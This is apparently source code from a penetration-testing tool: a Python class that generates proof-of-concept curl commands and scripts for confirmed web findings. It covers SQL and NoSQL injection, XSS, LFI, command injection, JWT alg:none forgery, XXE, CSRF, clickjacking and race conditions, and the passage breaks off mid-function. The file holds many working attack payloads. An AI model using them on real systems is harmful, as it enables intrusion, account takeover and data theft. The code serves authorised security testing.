"""
PoC Generator - Generate proof-of-concept scripts for confirmed findings.

Adapted from Zen-Ai-Pentest post-exploitation concepts, limited to PoC-level
demonstration only. No deep exploitation or secret extraction.
"""

from __future__ import annotations

import json
import textwrap
from typing import Any, Dict, Optional
from urllib.parse import quote, urlparse


class PoCGenerator:
    """Generate proof-of-concept scripts for confirmed findings.

    Each PoC is a curl command + minimal Python script that demonstrates
    the vulnerability exists. No exploitation chains, no secret extraction.
    """

    def generate(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a PoC for a finding.

        Parameters
        ----------
        finding : dict
            Finding details. Expected keys:
            - vuln_type (str): sqli, xss, idor, ssrf, lfi, cmdi, or other
            - url (str): Target URL
            - method (str): HTTP method (default GET)
            - parameter (str): Vulnerable parameter name
            - payload (str): Payload that triggers the vulnerability
            - request (str): Original HTTP request
            - response (str): Original HTTP response or indicator
            - title (str): Finding title
            - headers (dict): Custom headers

        Returns
        -------
        dict
            poc_type, language, script, curl_command, description, safety_level
        """
        vuln_type = (
            finding.get("vuln_type")
            or finding.get("type")
            or self._detect_vuln_type(finding)
        ).lower()

        generators = {
            "sqli": self._generate_sqli_poc,
            "sql_injection": self._generate_sqli_poc,
            "xss": self._generate_xss_poc,
            "cross_site_scripting": self._generate_xss_poc,
            "idor": self._generate_idor_poc,
            "insecure_direct_object_reference": self._generate_idor_poc,
            "ssrf": self._generate_ssrf_poc,
            "server_side_request_forgery": self._generate_ssrf_poc,
            "lfi": self._generate_lfi_poc,
            "local_file_inclusion": self._generate_lfi_poc,
            "cmdi": self._generate_cmdi_poc,
            "command_injection": self._generate_cmdi_poc,
            # 13 new PoC types (#28)
            "jwt_manipulation": self._generate_jwt_poc,
            "auth_bypass": self._generate_auth_bypass_poc,
            "privilege_escalation": self._generate_privesc_poc,
            "mass_assignment": self._generate_mass_assignment_poc,
            "xxe": self._generate_xxe_poc,
            "xml_injection": self._generate_xxe_poc,
            "nosql_injection": self._generate_nosql_poc,
            "cors_misconfig": self._generate_cors_poc,
            "clickjacking": self._generate_clickjacking_poc,
            "race_condition": self._generate_race_condition_poc,
            "insecure_deserialization": self._generate_deserialization_poc,
            "csrf": self._generate_csrf_poc,
            "session_fixation": self._generate_session_fixation_poc,
            "ssti": self._generate_ssti_poc,
        }

        gen = generators.get(vuln_type, self._generate_generic_poc)
        return gen(finding)

    def _detect_vuln_type(self, finding: Dict[str, Any]) -> str:
        """Attempt to detect vulnerability type from title/description."""
        title = (finding.get("title") or "").lower()
        desc = (finding.get("description") or "").lower()
        combined = f"{title} {desc}"

        type_keywords = {
            "sqli": ["sql injection", "sqli", "sql error", "union select"],
            "xss": ["cross-site scripting", "xss", "script injection"],
            "idor": ["idor", "insecure direct object", "broken access"],
            "ssrf": ["ssrf", "server-side request forgery"],
            "lfi": ["local file inclusion", "lfi", "path traversal", "directory traversal"],
            "cmdi": ["command injection", "os command", "rce", "remote code execution"],
        }

        for vuln_type, keywords in type_keywords.items():
            for kw in keywords:
                if kw in combined:
                    return vuln_type

        return "generic"

    def _generate_sqli_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SQLi PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        method = finding.get("method", "GET").upper()
        param = finding.get("parameter", "id")
        payload = finding.get("payload", "' OR 1=1-- -")
        headers = finding.get("headers", {})

        # Curl command
        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} -d \"{param}={quote(payload)}\" \"{url}\"".strip()

        # Python script
        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: SQL Injection - {finding.get('title', 'SQLi')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            payload = "{payload}"
            headers = {json.dumps(headers)}

            # Normal request (baseline)
            normal = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: "1"}}, headers=headers)

            # Injection request
            injected = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: payload}}, headers=headers)

            print(f"Baseline: status={{normal.status_code}}, length={{len(normal.text)}}")
            print(f"Injected: status={{injected.status_code}}, length={{len(injected.text)}}")

            if len(injected.text) != len(normal.text) or injected.status_code != normal.status_code:
                print("[!] Potential SQL injection confirmed - response differs")
            else:
                print("[-] Responses identical - may need different payload")
        """)

        return {
            "poc_type": "sqli",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"SQL injection PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    def _generate_xss_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate XSS PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "q")
        payload = finding.get("payload", "<script>alert(document.domain)</script>")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Cross-Site Scripting - {finding.get('title', 'XSS')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            payload = '{payload}'
            headers = {json.dumps(headers)}

            resp = requests.get(url, params={{param: payload}}, headers=headers)

            if payload in resp.text:
                print("[!] XSS confirmed - payload reflected unencoded in response")
                # Find the reflection context
                idx = resp.text.find(payload)
                context = resp.text[max(0, idx-50):idx+len(payload)+50]
                print(f"Context: ...{{context}}...")
            else:
                print("[-] Payload not reflected as-is in response")
        """)

        browser_url = f"{url}?{param}={quote(payload)}"

        return {
            "poc_type": "xss",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "browser_url": browser_url,
            "description": f"XSS PoC for {param} parameter at {url}",
            "safety_level": "safe",
        }

    def _generate_idor_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate IDOR PoC."""
        url = finding.get("url", "http://TARGET/api/users/1")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl_1 = f"curl -s {header_flags} \"{url}\"".strip()
        # Replace last ID segment with another value
        parsed = urlparse(url)
        path_parts = parsed.path.rstrip("/").split("/")
        if path_parts and path_parts[-1].isdigit():
            other_id = str(int(path_parts[-1]) + 1)
            alt_path = "/".join(path_parts[:-1] + [other_id])
            alt_url = f"{parsed.scheme}://{parsed.netloc}{alt_path}"
        else:
            alt_url = url + "?id=2"
        curl_2 = f"curl -s {header_flags} \"{alt_url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: IDOR - {finding.get('title', 'IDOR')}\"\"\"
            import requests

            url_own = "{url}"
            url_other = "{alt_url}"
            headers = {json.dumps(headers)}

            # Access own resource
            resp_own = requests.{method.lower()}(url_own, headers=headers)
            # Access other user's resource
            resp_other = requests.{method.lower()}(url_other, headers=headers)

            print(f"Own resource: status={{resp_own.status_code}}, length={{len(resp_own.text)}}")
            print(f"Other resource: status={{resp_other.status_code}}, length={{len(resp_other.text)}}")

            if resp_other.status_code == 200:
                print("[!] IDOR confirmed - accessed other user's resource with same credentials")
            elif resp_other.status_code in (401, 403):
                print("[-] Access denied - authorization check in place")
            else:
                print(f"[?] Unexpected status {{resp_other.status_code}}")
        """)

        return {
            "poc_type": "idor",
            "language": "python",
            "script": script,
            "curl_command": f"# Own resource:\\n{curl_1}\\n# Other user's resource:\\n{curl_2}",
            "description": f"IDOR PoC comparing access to {url} vs {alt_url}",
            "safety_level": "safe",
        }

    def _generate_ssrf_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SSRF PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "url")
        payload = finding.get("payload", "http://127.0.0.1:80")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} -d \"{param}={quote(payload)}\" \"{url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: SSRF - {finding.get('title', 'SSRF')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            # Test internal endpoint access
            payloads = [
                "http://127.0.0.1:80",
                "http://localhost:80",
                "http://[::1]:80",
            ]

            for ssrf_payload in payloads:
                resp = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: ssrf_payload}}, headers=headers, timeout=10)
                print(f"Payload: {{ssrf_payload}} -> status={{resp.status_code}}, length={{len(resp.text)}}")
        """)

        return {
            "poc_type": "ssrf",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"SSRF PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    def _generate_lfi_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate LFI PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "file")
        payload = finding.get("payload", "../../../../etc/passwd")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Local File Inclusion - {finding.get('title', 'LFI')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            payloads = [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
            ]

            for lfi_payload in payloads:
                resp = requests.get(url, params={{param: lfi_payload}}, headers=headers)
                if "root:" in resp.text or "daemon:" in resp.text:
                    print(f"[!] LFI confirmed with payload: {{lfi_payload}}")
                    print(f"Response excerpt: {{resp.text[:200]}}")
                    break
            else:
                print("[-] Standard LFI payloads did not return expected content")
        """)

        return {
            "poc_type": "lfi",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"LFI PoC for {param} parameter at {url}",
            "safety_level": "safe",
        }

    def _generate_cmdi_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate command injection PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "cmd")
        payload = finding.get("payload", "; id")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f"curl -s {header_flags} \"{url}?{param}={quote(payload)}\"".strip()
        else:
            curl = f"curl -s -X {method} {header_flags} -d \"{param}={quote(payload)}\" \"{url}\"".strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Command Injection - {finding.get('title', 'CMDi')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            # Use a safe command that proves execution
            payloads = [
                "; id",
                "| id",
                "`id`",
                "$(id)",
            ]

            for cmdi_payload in payloads:
                resp = requests.{method.lower()}(url, {"params" if method == "GET" else "data"}: {{param: "test" + cmdi_payload}}, headers=headers, timeout=10)
                if "uid=" in resp.text:
                    print(f"[!] Command injection confirmed with: {{cmdi_payload}}")
                    print(f"Response excerpt: {{resp.text[:200]}}")
                    break
            else:
                print("[-] Standard CMDi payloads did not return expected output")
        """)

        return {
            "poc_type": "cmdi",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Command injection PoC for {param} parameter at {url}",
            "safety_level": "caution",
        }

    # ===== 13 new PoC generators (#28) =====

    def _generate_jwt_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate JWT manipulation PoC."""
        url = finding.get("url", "http://TARGET/api/endpoint")
        headers = finding.get("headers", {})
        token = finding.get("payload", "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        # alg:none attack
        curl = f'curl -s {header_flags} -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: JWT Manipulation - {finding.get('title', 'JWT')}\"\"\"
            import requests, base64, json

            url = "{url}"
            headers = {json.dumps(headers)}

            # Test 1: alg:none (remove signature)
            header_b64 = base64.urlsafe_b64encode(json.dumps({{"alg": "none", "typ": "JWT"}}).encode()).rstrip(b'=').decode()
            payload_b64 = base64.urlsafe_b64encode(json.dumps({{"user": "admin"}}).encode()).rstrip(b'=').decode()
            none_token = f"{{header_b64}}.{{payload_b64}}."

            headers["Authorization"] = f"Bearer {{none_token}}"
            resp = requests.get(url, headers=headers, timeout=10)
            print(f"alg:none -> status={{resp.status_code}}, length={{len(resp.text)}}")
            if resp.status_code == 200:
                print("[!] JWT alg:none accepted - signature verification bypassed")
            else:
                print("[-] alg:none rejected")
        """)

        return {
            "poc_type": "jwt_manipulation",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"JWT manipulation PoC (alg:none) for {url}",
            "safety_level": "safe",
        }

    def _generate_auth_bypass_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate authentication bypass PoC."""
        url = finding.get("url", "http://TARGET/admin")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        # Forced browsing without credentials
        curl_no_auth = f'curl -s "{url}"'.strip()
        curl_with_auth = f'curl -s {header_flags} "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Auth Bypass - {finding.get('title', 'Auth Bypass')}\"\"\"
            import requests

            url = "{url}"
            auth_headers = {json.dumps(headers)}

            # Authenticated request (baseline)
            resp_auth = requests.get(url, headers=auth_headers, timeout=10)
            # Unauthenticated request (bypass attempt)
            resp_noauth = requests.get(url, timeout=10)

            print(f"Authenticated: status={{resp_auth.status_code}}, length={{len(resp_auth.text)}}")
            print(f"Unauthenticated: status={{resp_noauth.status_code}}, length={{len(resp_noauth.text)}}")

            if resp_noauth.status_code == 200 and len(resp_noauth.text) > 100:
                print("[!] Auth bypass confirmed - resource accessible without credentials")
            elif resp_noauth.status_code in (401, 403):
                print("[-] Authentication enforced correctly")
        """)

        return {
            "poc_type": "auth_bypass",
            "language": "python",
            "script": script,
            "curl_command": f"# Without auth:\\n{curl_no_auth}\\n# With auth:\\n{curl_with_auth}",
            "description": f"Auth bypass PoC (forced browsing) for {url}",
            "safety_level": "safe",
        }

    def _generate_privesc_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate privilege escalation PoC."""
        url = finding.get("url", "http://TARGET/api/users/profile")
        method = finding.get("method", "PUT").upper()
        headers = finding.get("headers", {})
        param = finding.get("parameter", "role")

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f'curl -s -X {method} {header_flags} -H "Content-Type: application/json" -d \'{{"role": "admin"}}\' "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Privilege Escalation - {finding.get('title', 'Privesc')}\"\"\"
            import requests

            url = "{url}"
            headers = {json.dumps(headers)}
            headers["Content-Type"] = "application/json"

            # Inject admin role as low-privilege user
            payloads = [
                {{"role": "admin"}},
                {{"isAdmin": True}},
                {{"user_type": "administrator"}},
                {{"permissions": ["admin", "write", "delete"]}},
            ]

            for payload in payloads:
                resp = requests.{method.lower()}(url, json=payload, headers=headers, timeout=10)
                print(f"Payload: {{payload}} -> status={{resp.status_code}}")
                if resp.status_code == 200:
                    print(f"[!] Privilege escalation may have succeeded with: {{payload}}")
        """)

        return {
            "poc_type": "privilege_escalation",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Privilege escalation PoC for {param} at {url}",
            "safety_level": "caution",
        }

    def _generate_mass_assignment_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate mass assignment PoC."""
        url = finding.get("url", "http://TARGET/api/users/register")
        method = finding.get("method", "POST").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f'curl -s -X {method} {header_flags} -H "Content-Type: application/json" -d \'{{"username": "test", "password": "test123", "isAdmin": true, "verified": true}}\' "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Mass Assignment - {finding.get('title', 'Mass Assignment')}\"\"\"
            import requests

            url = "{url}"
            headers = {json.dumps(headers)}
            headers["Content-Type"] = "application/json"

            # Normal registration
            normal = {{"username": "testuser", "password": "Test123!"}}
            # Mass assignment with hidden fields
            tampered = {{
                "username": "testuser2",
                "password": "Test123!",
                "isAdmin": True,
                "verified": True,
                "role": "admin",
                "balance": 999999,
            }}

            resp_normal = requests.{method.lower()}(url, json=normal, headers=headers, timeout=10)
            resp_tampered = requests.{method.lower()}(url, json=tampered, headers=headers, timeout=10)

            print(f"Normal: status={{resp_normal.status_code}}, body={{resp_normal.text[:300]}}")
            print(f"Tampered: status={{resp_tampered.status_code}}, body={{resp_tampered.text[:300]}}")

            if resp_tampered.status_code == 200:
                if "admin" in resp_tampered.text.lower() or "true" in resp_tampered.text.lower():
                    print("[!] Mass assignment likely - hidden fields accepted")
        """)

        return {
            "poc_type": "mass_assignment",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Mass assignment PoC for {url}",
            "safety_level": "caution",
        }

    def _generate_xxe_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate XXE PoC."""
        url = finding.get("url", "http://TARGET/api/xml")
        method = finding.get("method", "POST").upper()
        headers = finding.get("headers", {})

        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'
        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f'curl -s -X {method} {header_flags} -H "Content-Type: application/xml" -d \'{xxe_payload}\' "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: XXE - {finding.get('title', 'XXE')}\"\"\"
            import requests

            url = "{url}"
            headers = {json.dumps(headers)}
            headers["Content-Type"] = "application/xml"

            # Test 1: External entity file read (safe file)
            xxe_payload = '''<?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/hostname">
            ]>
            <root>&xxe;</root>'''

            resp = requests.{method.lower()}(url, data=xxe_payload, headers=headers, timeout=10)
            print(f"XXE file read: status={{resp.status_code}}, length={{len(resp.text)}}")

            # Check if hostname was included in response
            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"[?] Response: {{resp.text[:300]}}")
                print("[!] If response contains system hostname, XXE is confirmed")
            else:
                print("[-] XXE payload did not return expected content")
        """)

        return {
            "poc_type": "xxe",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"XXE PoC for {url}",
            "safety_level": "caution",
        }

    def _generate_nosql_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate NoSQL injection PoC."""
        url = finding.get("url", "http://TARGET/api/login")
        method = finding.get("method", "POST").upper()
        param = finding.get("parameter", "username")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        curl = f'curl -s -X {method} {header_flags} -H "Content-Type: application/json" -d \'{{"username": {{"$ne": ""}}, "password": {{"$ne": ""}}}}\' "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: NoSQL Injection - {finding.get('title', 'NoSQLi')}\"\"\"
            import requests

            url = "{url}"
            headers = {json.dumps(headers)}
            headers["Content-Type"] = "application/json"

            # MongoDB operator injection payloads
            payloads = [
                {{"username": {{"$ne": ""}}, "password": {{"$ne": ""}}}},
                {{"username": {{"$gt": ""}}, "password": {{"$gt": ""}}}},
                {{"username": "admin", "password": {{"$regex": ".*"}}}},
                {{"$where": "this.username == 'admin'"}},
            ]

            for payload in payloads:
                resp = requests.{method.lower()}(url, json=payload, headers=headers, timeout=10)
                print(f"Payload: {{payload}} -> status={{resp.status_code}}, length={{len(resp.text)}}")
                if resp.status_code == 200 and ("token" in resp.text.lower() or "session" in resp.text.lower()):
                    print(f"[!] NoSQL injection likely succeeded with: {{payload}}")
        """)

        return {
            "poc_type": "nosql_injection",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"NoSQL injection PoC for {param} at {url}",
            "safety_level": "caution",
        }

    def _generate_cors_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate CORS misconfiguration PoC."""
        url = finding.get("url", "http://TARGET/api/sensitive")
        headers = finding.get("headers", {})

        curl = f'curl -s -H "Origin: https://evil.com" -v "{url}" 2>&1 | grep -i "access-control"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: CORS Misconfiguration - {finding.get('title', 'CORS')}\"\"\"
            import requests

            url = "{url}"

            # Test with evil origin
            origins = ["https://evil.com", "null", "https://target.com.evil.com"]
            for origin in origins:
                resp = requests.get(url, headers={{"Origin": origin}}, timeout=10)
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                print(f"Origin: {{origin}}")
                print(f"  ACAO: {{acao}}, ACAC: {{acac}}")
                if acao == origin or acao == "*":
                    if acac.lower() == "true":
                        print("  [!] CRITICAL: Credentials allowed with reflected/wildcard origin")
                    else:
                        print("  [!] Origin reflected/wildcard in ACAO")
        """)

        # Browser-based PoC (HTML)
        browser_poc = textwrap.dedent(f"""\
            <script>
            fetch("{url}", {{credentials: "include"}})
              .then(r => r.text())
              .then(d => console.log("Stolen data:", d));
            </script>""")

        return {
            "poc_type": "cors_misconfig",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "browser_poc": browser_poc,
            "description": f"CORS misconfiguration PoC for {url}",
            "safety_level": "safe",
        }

    def _generate_clickjacking_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate clickjacking PoC."""
        url = finding.get("url", "http://TARGET/settings")

        html_poc = textwrap.dedent(f"""\
            <!DOCTYPE html>
            <html>
            <head><title>Clickjacking PoC</title></head>
            <body>
            <h1>Click the button below:</h1>
            <div style="position:relative;">
              <iframe src="{url}" style="opacity:0.3;position:absolute;top:0;left:0;width:100%;height:500px;z-index:2;"></iframe>
              <button style="position:relative;z-index:1;padding:20px;font-size:18px;">Click Here for Prize!</button>
            </div>
            </body>
            </html>""")

        curl = f'curl -s -I "{url}" | grep -i "x-frame-options\\|frame-ancestors"'.strip()

        return {
            "poc_type": "clickjacking",
            "language": "html",
            "script": html_poc,
            "curl_command": curl,
            "description": f"Clickjacking PoC embedding {url} in iframe",
            "safety_level": "safe",
        }

    def _generate_race_condition_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate race condition PoC."""
        url = finding.get("url", "http://TARGET/api/transfer")
        method = finding.get("method", "POST").upper()
        headers = finding.get("headers", {})
        body = finding.get("payload", '{"amount": 1, "to": "user2"}')

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())

        # Bash parallel curl script
        bash_script = textwrap.dedent(f"""\
            #!/bin/bash
            # PoC: Race Condition - {finding.get('title', 'Race Condition')}
            # Sends 10 parallel requests to test for TOCTOU

            URL="{url}"

            for i in $(seq 1 10); do
              curl -s -X {method} {header_flags} -H "Content-Type: application/json" \\
                -d '{body}' "$URL" &
            done
            wait
            echo "All requests completed"
        """)

        python_script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Race Condition - {finding.get('title', 'Race Condition')}\"\"\"
            import requests, concurrent.futures, json

            url = "{url}"
            headers = {json.dumps(headers)}
            headers["Content-Type"] = "application/json"
            body = {body}

            def send_request(i):
                resp = requests.{method.lower()}(url, json=body, headers=headers, timeout=10)
                return i, resp.status_code, len(resp.text)

            # Send 10 concurrent requests
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(send_request, i) for i in range(10)]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]

            for i, status, length in sorted(results):
                print(f"Request {{i}}: status={{status}}, length={{length}}")

            success_count = sum(1 for _, s, _ in results if s == 200)
            print(f"\\n{{success_count}}/10 requests succeeded")
            if success_count > 1:
                print("[!] Multiple concurrent requests succeeded - race condition likely")
        """)

        return {
            "poc_type": "race_condition",
            "language": "python",
            "script": python_script,
            "bash_script": bash_script,
            "curl_command": f"# Run in parallel:\\n" + " & ".join([f'curl -s -X {method} {header_flags} -d \'{body}\' "{url}"'] * 5),
            "description": f"Race condition PoC (10 parallel requests) for {url}",
            "safety_level": "caution",
        }

    def _generate_deserialization_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate insecure deserialization PoC."""
        url = finding.get("url", "http://TARGET/api/endpoint")
        method = finding.get("method", "POST").upper()
        param = finding.get("parameter", "data")
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Insecure Deserialization - {finding.get('title', 'Deserialization')}\"\"\"
            import requests, base64

            url = "{url}"
            headers = {json.dumps(headers)}

            # Java serialized object header (magic bytes: ac ed 00 05)
            java_payload = base64.b64encode(b'\\xac\\xed\\x00\\x05').decode()

            # PHP serialized object
            php_payload = 'O:8:"stdClass":1:{{s:4:"test";s:4:"true";}}'

            # Python pickle (safe detection only)
            python_payload = base64.b64encode(b'\\x80\\x04\\x95').decode()

            payloads = [
                ("Java", java_payload),
                ("PHP", php_payload),
                ("Python", python_payload),
            ]

            for name, payload in payloads:
                resp = requests.{method.lower()}(url, {"data" if method != "GET" else "params"}: {{"{param}": payload}}, headers=headers, timeout=10)
                print(f"{{name}}: status={{resp.status_code}}, length={{len(resp.text)}}")
                for indicator in ["ClassNotFoundException", "UnpicklingError", "unserialize()", "__PHP_Incomplete"]:
                    if indicator in resp.text:
                        print(f"  [!] Deserialization indicator found: {{indicator}}")
        """)

        curl = f'curl -s -X {method} {header_flags} -d "{param}=rO0ABQ==" "{url}"'.strip()

        return {
            "poc_type": "insecure_deserialization",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Insecure deserialization PoC for {param} at {url}",
            "safety_level": "caution",
        }

    def _generate_csrf_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate CSRF PoC."""
        url = finding.get("url", "http://TARGET/api/action")
        method = finding.get("method", "POST").upper()
        body = finding.get("payload", "action=delete&id=1")

        # Build HTML form fields from body
        form_fields = ""
        if "=" in body:
            for pair in body.split("&"):
                parts = pair.split("=", 1)
                if len(parts) == 2:
                    form_fields += f'    <input type="hidden" name="{parts[0]}" value="{parts[1]}" />\n'
        else:
            form_fields = f'    <input type="hidden" name="data" value="{body}" />\n'

        html_poc = textwrap.dedent(f"""\
            <!DOCTYPE html>
            <html>
            <head><title>CSRF PoC</title></head>
            <body onload="document.forms[0].submit();">
            <form action="{url}" method="{method}">
            {form_fields.rstrip()}
            </form>
            </body>
            </html>""")

        return {
            "poc_type": "csrf",
            "language": "html",
            "script": html_poc,
            "curl_command": f'curl -s -X {method} -d "{body}" "{url}"',
            "description": f"CSRF PoC (auto-submit form) for {url}",
            "safety_level": "safe",
        }

    def _generate_session_fixation_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate session fixation PoC."""
        url = finding.get("url", "http://TARGET/login")
        headers = finding.get("headers", {})
        cookie_name = finding.get("parameter", "PHPSESSID")

        curl = f'curl -s -b "{cookie_name}=attacker-fixed-session-id" "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Session Fixation - {finding.get('title', 'Session Fixation')}\"\"\"
            import requests

            url = "{url}"
            cookie_name = "{cookie_name}"
            fixed_session = "attacker-controlled-session-12345"

            # Step 1: Set a pre-determined session ID
            session = requests.Session()
            session.cookies.set(cookie_name, fixed_session)

            # Step 2: Login with the fixed session
            resp = session.get(url, timeout=10)
            print(f"Pre-login cookie: {{session.cookies.get(cookie_name)}}")

            # Step 3: Check if session ID was regenerated
            post_session = session.cookies.get(cookie_name)
            print(f"Post-login cookie: {{post_session}}")

            if post_session == fixed_session:
                print("[!] Session fixation confirmed - session ID not regenerated after login")
            else:
                print("[-] Session ID was regenerated (protected)")
        """)

        return {
            "poc_type": "session_fixation",
            "language": "python",
            "script": script,
            "curl_command": curl,
            "description": f"Session fixation PoC for {cookie_name} at {url}",
            "safety_level": "safe",
        }

    def _generate_ssti_poc(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SSTI PoC."""
        url = finding.get("url", "http://TARGET/endpoint")
        param = finding.get("parameter", "name")
        method = finding.get("method", "GET").upper()
        headers = finding.get("headers", {})

        header_flags = " ".join(f'-H "{k}: {v}"' for k, v in headers.items())
        if method == "GET":
            curl = f'curl -s {header_flags} "{url}?{param}={{{{7*7}}}}"'.strip()
        else:
            curl = f'curl -s -X {method} {header_flags} -d "{param}={{{{7*7}}}}" "{url}"'.strip()

        script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"PoC: Server-Side Template Injection - {finding.get('title', 'SSTI')}\"\"\"
            import requests

            url = "{url}"
            param = "{param}"
            headers = {json.dumps(headers)}

            # Template expressions for different engines
            payloads = [
                ("Jinja2/Twig", "{{{{7*7}}}}"),
